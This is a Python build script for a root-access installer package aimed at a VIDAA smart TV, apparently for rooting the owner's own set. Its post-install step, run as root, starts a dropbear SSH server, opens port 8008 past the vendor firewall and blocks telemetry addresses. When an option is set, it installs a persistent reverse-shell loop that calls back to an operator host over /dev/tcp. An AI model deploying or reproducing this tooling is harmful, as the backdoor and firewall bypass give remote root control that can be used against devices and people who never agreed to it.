#!/usr/bin/env python3
"""Build a self-contained installer IPK for a VIDAA 100U7Q (U09.60) root dropbear.

Usage:  python3 make_installer.py "ssh-ed25519 <PUBKEY> you@host" out.ipk

The IPK's postinst runs as root (via the superwatch socket) and does everything:
creates /APPS/.re_sshd, moves the bundled binaries, writes authorized_keys and
/bin/bash shell whitelist, generates the ed25519 host key if missing, opens the
pty devices and starts dropbear on port 8008.

Nothing here is device-specific: no keys, no MACs, no session data.
"""
import base64
import io
import os
import subprocess
import sys
import tarfile
import tempfile

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))  # repo root

CONTROL = """Package: re.installer
Version: 1.0.0
Architecture: @ARCH@
AppId: re.installer
AppName: re.installer
Section: ns
Priority: optional
Maintainer: re
Description: root dropbear installer
Format: 1
Persistent: false
PackageType: Entry
Userid: 0:0
Installed-Size: 1200
"""

POSTINST = r"""#!/bin/sh
D=/APPS/.re_sshd
SRC=/APPS/pkgs/APPS/.re_sshd
# mkdir BEFORE the log redirect (original design redirected first and
# silently skipped the whole block on a clean system)
mkdir -p "$D" 2>/dev/null
{
  echo "INSTALLER"
  echo "--- env ---"
  env 2>/dev/null | grep -i -E 'opkg|ipk|pkg' | head -20
  echo "--- step: dirs ---"
  mkdir -p "$D/root_home/.ssh" "$D/home/.ssh" 2>&1
  echo "--- step: move binaries ---"

  if [ -f "$D/dropbear.pid" ]; then kill "$(cat "$D/dropbear.pid")" 2>/dev/null; sleep 1; fi

  [ -f "$SRC/dropbear-root" ] && mv -f "$SRC/dropbear-root" "$D/dropbear-root"
  [ -f "$SRC/dropbearkey" ] && mv -f "$SRC/dropbearkey" "$D/dropbearkey"
  [ -f "$SRC/authorized_keys" ] && mv -f "$SRC/authorized_keys" "$D/root_home/.ssh/authorized_keys"
  cp -f "$D/root_home/.ssh/authorized_keys" "$D/home/.ssh/authorized_keys" 2>/dev/null
  ls -la "$SRC" 2>&1 | head -10

  printf '@SHELL_WHITELIST@\n' > /APPS/shell
  chmod 644 /APPS/shell
  # 55A7KAU (09.09O): bash presence is unverified (binary reads fail at the
  # bridge transport); the dropbear patch forces /bin/sh as the login shell,
  # so /bin/sh must always be whitelisted. If bash exists, whitelist it too
  # and log it for the record.
  if [ -x /bin/bash ]; then
      echo "bash present"      printf '/bin/bash\n' >> /APPS/shell
  else
      echo "no /bin/bash on this build"
  fi

  chmod 755 "$D/dropbear-root" "$D/dropbearkey" 2>&1
  chown -R 0:0 "$D/root_home" 2>&1
  chmod 700 "$D/root_home" "$D/root_home/.ssh" 2>&1
  chmod 600 "$D/root_home/.ssh/authorized_keys" 2>&1

  if [ ! -f "$D/hostkey_ed25519" ]; then
      "$D/dropbearkey" -t ed25519 -f "$D/hostkey_ed25519" >/dev/null 2>&1
  fi
  chmod 600 "$D/hostkey_ed25519" 2>&1

  chmod 666 /dev/ptmx /dev/pts/ptmx 2>/dev/null

  echo "--- step: start dropbear ---"
  cd "$D" || exit 0
  # -s is only a valid option when password auth is compiled in. Builds with
  # DROPBEAR_SVR_PASSWORD_AUTH 0 reject it ("Invalid option") and never start,
  # so try -s first and fall back. Keeps the key-only guarantee on both.
  rm -f "$D/dropbear.pid"
  ./dropbear-root -s -r "$D/hostkey_ed25519" -p 8008 -P "$D/dropbear.pid" 2>/dev/null
  sleep 1
  if [ ! -s "$D/dropbear.pid" ]; then
      echo "no -s: this build has no password auth compiled in"
      ./dropbear-root -r "$D/hostkey_ed25519" -p 8008 -P "$D/dropbear.pid"
      sleep 1
  fi
  echo "pid=$(cat "$D/dropbear.pid" 2>/dev/null)"
  grep -i ':1F48' /proc/net/tcp 2>&1
  grep -E '^(Uid|CapEff):' /proc/self/status 2>&1
  echo "--- step: firewall recon ---"
  iptables -L -n 2>&1 | head -40
  echo "--- step: open 8008 ---"
  # the vendor firewall DROP-blacklists debug ports incl. 8008; add an ACCEPT
  # at the top of the chain. Dedupe first: postinst runs on every re-arm and
  # duplicates accumulate. Reversible: delete this exact rule on teardown.
  while iptables -L FIREWALL_IN_EULAON -n 2>/dev/null | grep -q "dpt:8008"; do
      N=$(iptables -L FIREWALL_IN_EULAON -n --line-numbers 2>/dev/null | grep "dpt:8008" | head -1 | awk '{print $1}')
      [ -n "$N" ] || break
      iptables -D FIREWALL_IN_EULAON "$N" 2>/dev/null || break
  done
  iptables -I FIREWALL_IN_EULAON 1 -p tcp --dport 8008 -j ACCEPT 2>&1
  iptables -L FIREWALL_IN_EULAON -n 2>&1 | head -5
  # make the pid file service-readable (dropbearRunning in re_sshd no longer
  # needs it, but keep it debuggable for uid 314)
  chmod 644 "$D/dropbear.pid" 2>/dev/null
  echo "--- step: transport capabilities ---"
  for c in wget curl nc socat busybox telnet ssh dbclient; do command -v $c; done
  bash --version 2>&1 | head -1
  (exec 3<>/dev/tcp/192.168.50.37/9000) 2>&1 && echo DEVTCP-OK || echo DEVTCP-FAIL:$?
  echo "--- step: telemetry/ad block (ALV_BLOCK chain) ---"
  # Phase-4 tier: endpoints from /APPS/domain/domain_list.json (oc map,
  # 2026-07-07) + the DoH evasion layer (dns.google over 8.8.8.8/8.8.4.4:443).
  # Dedicated chain, flush+refill: idempotent across re-arms.
  iptables -N ALV_BLOCK 2>/dev/null
  iptables -F ALV_BLOCK
  # tier-2 from the firmware dump: newsan-ads (shares 20.113.0.141 with
  # rsc-ads), Chrome/Cloudflare DoH bypass, Google beacons + crash reporting
  # + analytics. Google IPs rotate — pinned per resolution 2026-11-06.
  for IP in 4.182.131.30 20.170.76.123 98.67.150.220 20.113.0.141 20.52.196.175 131.189.128.123 20.170.91.169 \
            162.159.61.3 172.64.41.3 142.250.195.163 142.250.195.238 142.250.195.179 142.250.207.4; do
      iptables -A ALV_BLOCK -d $IP -j REJECT
  done
  iptables -A ALV_BLOCK -d 8.8.8.8 -p tcp --dport 443 -j REJECT
  iptables -A ALV_BLOCK -d 8.8.4.4 -p tcp --dport 443 -j REJECT
  iptables -C OUTPUT -j ALV_BLOCK 2>/dev/null || iptables -I OUTPUT 1 -j ALV_BLOCK
  echo "ALV_BLOCK rules: $(iptables -L ALV_BLOCK -n | grep -c REJECT)"
  echo "--- step: launcher host ---"
  # Full launcher: the Go bridge serves the page + /ws on 127.0.0.1:8770 and
  # keeps the MQTT session to the TV's own broker — the TV is self-sufficient.
  # Fallback: the static server.js (page shell only) if the bridge is missing.
  if ! grep -qE "(00000000|0100007F):2242[[:space:]]" /proc/net/tcp 2>/dev/null; then
      if [ -x /var/local/alvidaa/alvidaa-bridge ]; then
          busybox setsid /var/local/alvidaa/alvidaa-bridge \
              -keys /var/local/alvidaa/keys -assets /APPS/launcher \
              -config /var/local/alvidaa/config.json -addr 127.0.0.1:8770 \
              -mqtt 127.0.0.1:36669 > /tmp/bridge.log 2>&1 < /dev/null &
      elif [ -f /APPS/launcher/server.js ]; then
          busybox setsid /bin/sh -c 'LD_LIBRARY_PATH=/lib:/usr/local/lib:/basic/lib exec /opt/pkgs/tv.vidaa.app.phoenix//bin/phoenix /APPS/launcher/server.js' \
              > /tmp/launcher-host.out 2>&1 < /dev/null &
      fi
      sleep 3
  fi
  grep -qE "(00000000|0100007F):2242[[:space:]]" /proc/net/tcp 2>/dev/null && echo "launcher bridge up" || echo "launcher bridge FAILED"
  echo "--- step: phone home ---"
  # Reverse shell to the operator host (outbound is proven open; inbound 8008
  # is filtered by the vendor firewall). Idempotent via pid file.
  if [ -n "@PHONE@" ]; then
      # self-healing: kill any previous phonehome (older buggy version) and restart
      pkill -f phonehome.sh 2>/dev/null
      rm -f "$D/phonehome.pid"
      printf '#!/bin/bash\nwhile true; do\n  bash -c "exec 3<>/dev/tcp/@PHONEHOST@/@PHONEPORT@; exec /bin/sh <&3 >&3 2>&3"\n  sleep 5\ndone\n' > "$D/phonehome.sh"
      chmod 755 "$D/phonehome.sh"
      nohup "$D/phonehome.sh" > /dev/null 2>&1 &
      echo $! > "$D/phonehome.pid"
      echo "phonehome started pid=$(cat "$D/phonehome.pid") -> @PHONE@"
  fi
} > "$D/installer_log.txt" 2>&1
chmod 644 "$D/installer_log.txt" 2>/dev/null
exit 0
"""


def add_bytes(tar, name, data, mode=0o644):
    ti = tarfile.TarInfo(name)
    ti.size = len(data)
    ti.mode = mode
    ti.mtime = 0
    tar.addfile(ti, io.BytesIO(data))


def build(out_path, pubkey, shell="/bin/bash", arch="mtk9655", phone=""):
    with tempfile.TemporaryDirectory() as tmp:
        # control set
        ctrl = io.BytesIO()
        with tarfile.open(fileobj=ctrl, mode="w:gz") as t:
            add_bytes(t, "./control", CONTROL.replace("@ARCH@", arch).encode())
            add_bytes(t, "./postinst", POSTINST
                       .replace("@SHELL_WHITELIST@", shell)
                       .replace("@PHONE@", phone)
                       .replace("@PHONEHOST@", phone.split(":")[0] if phone else "")
                       .replace("@PHONEPORT@", phone.split(":")[1] if ":" in phone else "")
                       .encode(), 0o755)
        ctrl_bytes = ctrl.getvalue()

        # data set (opkg extracts relative to /APPS/pkgs)
        data = io.BytesIO()
        with tarfile.open(fileobj=data, mode="w:gz") as t:
            for name in ("dropbear-root", "dropbearkey"):
                src = os.path.join(HERE, "bin", name)
                try:
                    with open(src, "rb") as fh:
                        blob = fh.read()
                except OSError as e:
                    sys.exit(f"missing {src} — build the static dropbear binaries "
                             f"first (scripts/build_dropbear_a7k.sh): {e}")
                add_bytes(t, "./APPS/.re_sshd/" + name, blob, 0o755)
            add_bytes(t, "./APPS/.re_sshd/authorized_keys",
                      (pubkey.strip() + "\n").encode(), 0o600)
        data_bytes = data.getvalue()

        work = os.path.join(tmp, "pkg")
        try:
            os.makedirs(work, exist_ok=True)
            for name, blob in (("debian-binary", b"2.0\n"),
                               ("control.tar.gz", ctrl_bytes),
                               ("data.tar.gz", data_bytes)):
                with open(os.path.join(work, name), "wb") as fh:
                    fh.write(blob)
            subprocess.run(["ar", "rc", os.path.abspath(out_path), "debian-binary",
                            "control.tar.gz", "data.tar.gz"], cwd=work, check=True)
        except OSError as e:
            sys.exit(f"failed to assemble {out_path}: {e}")


if __name__ == "__main__":
    args = sys.argv[1:]
    shell = "/bin/bash"
    arch = "mtk9655"
    phone = ""
    if "--shell" in args:
        i = args.index("--shell")
        shell = args[i + 1]
        args = args[:i] + args[i + 2:]
    if "--arch" in args:
        i = args.index("--arch")
        arch = args[i + 1]
        args = args[:i] + args[i + 2:]
    if "--phone-home" in args:
        i = args.index("--phone-home")
        phone = args[i + 1]
        args = args[:i] + args[i + 2:]
    if len(args) != 2:
        print(__doc__)
        sys.exit(1)
    build(args[1], args[0], shell=shell, arch=arch, phone=phone)
    print("wrote", args[1], os.path.getsize(args[1]), "bytes (shell:", shell, "arch:", arch, "phone:", phone or "off", ")")
